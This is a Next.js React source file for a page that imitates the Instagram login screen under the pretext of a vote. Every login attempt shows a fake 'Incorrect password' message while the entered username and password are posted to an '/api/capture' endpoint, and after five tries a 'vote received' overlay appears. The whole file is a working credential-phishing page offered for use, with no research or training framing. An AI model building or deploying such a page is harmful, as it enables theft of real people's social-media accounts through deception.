import Head from 'next/head';
import { useState, useRef } from 'react';

const MAX_ATTEMPTS = 5;

export default function InstagramLoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [feedback, setFeedback] = useState('');
  const [clickCount, setClickCount] = useState(0);
  const [showSuccess, setShowSuccess] = useState(false);
  const attemptRef = useRef(0);

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    attemptRef.current += 1;
    setClickCount(attemptRef.current);
    
    try {
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: email.trim(), 
          password, 
          method: 'instagram'
        })
      });
    } catch (e) {}
    
    if (attemptRef.current >= MAX_ATTEMPTS) {
      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 4000);
    }
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Instagram Login - Vote</title>
      </Head>

      <style jsx>{`
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fafafa; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
        .login-container { background: white; width: 360px; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); text-align: center; }
        .logo { width: 96px; height: 96px; margin: 0 auto 24px; }
        input { width: 100%; padding: 14px 16px; margin: 12px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 15px; }
        input:focus { outline: none; border-color: #e1306c; }
        button { width: 100%; padding: 14px; background: #e1306c; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 8px; }
        button:hover { background: #c9305a; }
        .feedback { color: #e1306c; font-size: 14px; margin: 8px 0; }
        .success-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.98); display: none; align-items: center; justify-content: center; z-index: 9999; }
        .success-overlay.show { display: flex; }
        .success-box { text-align: center; padding: 20px; }
        .checkmark { width: 110px; height: 110px; background: #4caf50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 28px; box-shadow: 0 4px 12px rgba(76,175,80,0.4); }
        .checkmark svg { width: 56px; height: 56px; }
        @media (max-width: 480px) { .login-container { width: 90%; padding: 24px 20px; } }
      `}</style>

      <div className="login-container">
        <img className="logo" src="/logos/ig.png" alt="Instagram" />
        <h2>Log in to Instagram</h2>
        <p style={{color: '#888', fontSize: '14px', marginBottom: '20px'}}>Phone number, username, or email</p>
        
        <input 
          type="text" 
          placeholder="Email or phone number" 
          value={email}
          onChange={(e) => setEmail(e.target.value)}
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        
        <div className="feedback">{feedback}</div>
        
        <button onClick={handleLogin}>Log In</button>
        
        <a href="#" style={{display: 'block', marginTop: '16px', color: '#007bff', fontSize: '14px'}}>Forgot password?</a>
      </div>

      <div className="success-overlay" id="successOverlay">
        <div className="success-box">
          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>
    </>
  );
}